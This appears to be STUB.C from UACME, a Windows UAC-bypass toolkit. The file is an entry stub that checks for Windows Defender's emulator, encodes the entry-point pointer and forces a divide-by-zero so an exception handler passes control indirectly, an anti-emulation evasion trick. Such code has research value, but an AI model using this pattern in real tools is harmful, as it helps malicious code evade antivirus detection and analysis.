/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2022
*
*  TITLE:       STUB.C
*
*  VERSION:     3.59
*
*  DATE:        02 Feb 2022
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "(^/\\^)" };

/*
* ucmSehHandler
*
* Purpose:
*
* Program entry point seh handler, indirect control passing.
*
*/
INT ucmSehHandler(
    _In_ UINT ExceptionCode,
    _In_ EXCEPTION_POINTERS* ExceptionInfo
)
{
    UACME_THREAD_CONTEXT* uctx;

    UNREFERENCED_PARAMETER(ExceptionInfo);

    if (ExceptionCode == STATUS_INTEGER_DIVIDE_BY_ZERO) {
        uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
        while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
            uctx = (UACME_THREAD_CONTEXT*)uctx->Frame.Previous;
        }
        if (uctx) {
            if (uctx->ucmMain) {
                uctx->ucmMain = (pfnEntryPoint)supDecodePointer(uctx->ucmMain);

                uctx->ReturnedResult = uctx->ucmMain(UacMethodInvalid,
                    NULL,
                    0,
                    FALSE);
            }
        }
        return EXCEPTION_EXECUTE_HANDLER;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

DWORD StubInit(
    _In_ PVOID EntryPoint)
{
    int v = 1, d = 0;
    UACME_THREAD_CONTEXT uctx;

    RtlSecureZeroMemory(&uctx, sizeof(uctx));

    if (wdIsEmulatorPresent() == STATUS_NOT_SUPPORTED) {

        uctx.Frame.Context = &g_fctx;

        uctx.ucmMain = (pfnEntryPoint)supEncodePointer(EntryPoint);
        RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);

        __try {
            v = (int)USER_SHARED_DATA->NtProductType;
            d = (int)USER_SHARED_DATA->AlternativeArchitecture;
            v = (int)(v / d);
        }
        __except (ucmSehHandler(GetExceptionCode(), GetExceptionInformation())) {
            v = 1;
        }

        RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
    }

    if (v)
        return uctx.ReturnedResult;
    else
        return (DWORD)STATUS_ACCESS_DENIED;
}
